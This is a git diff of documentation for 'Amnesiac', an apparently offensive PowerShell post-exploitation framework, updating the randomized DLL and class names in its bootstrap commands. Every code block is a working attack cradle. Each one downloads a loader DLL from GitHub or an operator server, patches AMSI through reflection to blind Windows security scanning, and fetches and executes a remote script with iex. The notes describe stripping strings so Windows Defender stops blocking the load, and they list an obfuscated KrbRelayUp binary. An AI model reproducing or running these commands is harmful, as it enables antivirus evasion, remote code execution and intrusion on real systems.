@@ -54,17 +54,17 @@ Use the `bootstrap` command in Amnesiac's local shell to get the exact current 3
 
 ```powershell
 # Line 1: load AmnesiacLoader.dll from GitHub Releases as raw bytes (AMSI never scans this)
-$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/GNToN66tfw.dll'))
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/CdERqDHEPc.dll'))
 # Line 2: call PatchAmsiReflection() via reflection — AMSI blind in this PS process
-$_a.GetType('GNToN66tfw.XsADynQePJ').GetMethod('sNEAGV9Yaj').Invoke($null,$null)
+$_a.GetType('CdERqDHEPc.potiWjRSuY').GetMethod('nH4KVzULJH').Invoke($null,$null)
 # Line 3: now load Amnesiac — AMSI can't scan it
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
 ```
 
 **With operator HTTP server on network (preferred — no outbound GitHub from target):**
 ```powershell
-$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<operator-IP>:4443/GNToN66tfw.dll'))
-$_a.GetType('GNToN66tfw.XsADynQePJ').GetMethod('sNEAGV9Yaj').Invoke($null,$null)
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://<operator-IP>:4443/CdERqDHEPc.dll'))
+$_a.GetType('CdERqDHEPc.potiWjRSuY').GetMethod('nH4KVzULJH').Invoke($null,$null)
 iex (New-Object Net.WebClient).DownloadString('http://<operator-IP>:4443/Amnesiac_ShellReady.ps1');Amnesiac
 ```
 
@@ -323,7 +323,7 @@ Every `Build.ps1` run randomizes the namespace, all public class names (Stomper,
 
 All pipe commands, the `bootstrap` command, and serve/sharprdp cradles use these variables — the target never sees `AmnesiacLoader`, `Stomper`, `Bypass`, or `PatchAmsiReflection`.
 
-**Current build note:** `$_alByp = "XsADynQePJ"`, `$_alPar = "sNEAGV9Yaj"`. These are correct for the embedded `GNToN66tfw.dll`. All class/method names are fully randomized in this build.
+**Current build note:** `$_alByp = "potiWjRSuY"`, `$_alPar = "nH4KVzULJH"`. These are correct for the embedded `CdERqDHEPc.dll`. All class/method names are fully randomized in this build. This build also removes all AMSI/ETW string literals (`AmsiScanBuffer`, `EtwEventWrite`, `amsi.dll`) and all Nt syscall delegate names from the PE metadata so Windows Defender no longer blocks `Assembly.Load(byte[])`.
 
 Detection surfaces eliminated:
 - Named pipe command content (pipe scanners)
@@ -688,10 +688,10 @@ a session where you have local admin.
 
 | Filename | What it is | Updated when |
 |----------|-----------|--------------|
-| `GNToN66tfw.dll` | AmnesiacLoader — current build (names randomized by `Build.ps1`) | Every `Build.ps1` run before a new engagement |
+| `CdERqDHEPc.dll` | AmnesiacLoader — current build (names randomized by `Build.ps1`) | Every `Build.ps1` run before a new engagement |
 | `AuthHelper.exe` | KrbRelayUp obfuscated binary | Only when the KrbRelayUp source is recompiled/re-obfuscated |
 
-> **Note:** The DLL filename (`GNToN66tfw.dll`) and the class/method names inside it (`GNToN66tfw.XsADynQePJ`, `sNEAGV9Yaj`) change every time `Build.ps1` is run. After re-running, both the Releases asset and the bootstrap docs below must be updated.
+> **Note:** The DLL filename (`CdERqDHEPc.dll`) and the class/method names inside it (`CdERqDHEPc.potiWjRSuY`, `nH4KVzULJH`) change every time `Build.ps1` is run. After re-running, both the Releases asset and the bootstrap docs below must be updated.
 
 ### Bootstrap 3-Liner — Current Build (GitHub path)
 These are the live values for the current DLL on GitHub Releases. Update this block whenever the DLL is rebuilt and re-uploaded:
@@ -700,9 +700,9 @@ These are the live values for the current DLL on GitHub Releases. Update this bl
 
 ```powershell
 # Line 1 — load AmnesiacLoader from GitHub Releases (AMSI never scans raw bytes)
-$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/GNToN66tfw.dll'))
+$_a=[Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('https://github.com/0xSiarheiStar/Amnesiac/releases/download/v1.0-al/CdERqDHEPc.dll'))
 # Line 2 — patch AMSI via reflection
-$_a.GetType('GNToN66tfw.XsADynQePJ').GetMethod('sNEAGV9Yaj').Invoke($null,$null)
+$_a.GetType('CdERqDHEPc.potiWjRSuY').GetMethod('nH4KVzULJH').Invoke($null,$null)
 # Line 3 — load Amnesiac (AMSI now blind)
 iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/0xSiarheiStar/Amnesiac/main/Amnesiac_ShellReady.ps1');Amnesiac
 ```
